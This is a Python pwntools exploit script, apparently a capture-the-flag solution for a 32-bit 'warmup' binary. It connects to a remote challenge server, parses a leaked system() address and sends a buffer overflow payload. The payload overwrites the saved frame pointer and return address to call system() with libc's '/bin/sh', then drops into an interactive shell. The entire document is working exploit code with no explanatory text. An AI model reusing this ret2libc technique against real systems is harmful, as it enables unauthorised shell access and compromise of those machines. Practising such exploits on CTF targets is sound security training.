from pwn import *

# Turn on debug info
#context.log_level = 'DEBUG'

# Properly create GDB instance
context.terminal = ["tmux", "new-window"]

# Debug Spawn Context
#p = gdb.debug(['./warmup'])

# Local Context
#p = process('./warmup')

# Remote Context
p = remote('pwnremote.threatsims.com', 9000)

# Read until ready to spit out system.
p.recvuntil("@ ")

# Grab system address.
systemaddr = p.recvline()

# Dump it out.
print("system@" + systemaddr)

# Parse it
systemaddr = int(systemaddr, 16)

# Overwrite EBP with:
ebp = "BBBB"

# Overwrite RET ptr with system.
ret = systemaddr

# System argument is:
systemarg = ret + 0x120c6b # Offset to libc "/bin/sh"
systemarg = ret + 0xf075f # libc6_2.11.1-0ubuntu7.21_i386
systemarg = ret + 0x14cb22 # libc6_2.31-0ubuntu9_i386

binsh = "/bin/sh\00"

payload = binsh + 'A'*(40 - len(binsh)) + ebp + p32(ret) + p32(systemarg) + p32(systemarg) + "CCCC"
p.recvuntil("> ")

p.sendline(payload)

p.interactive()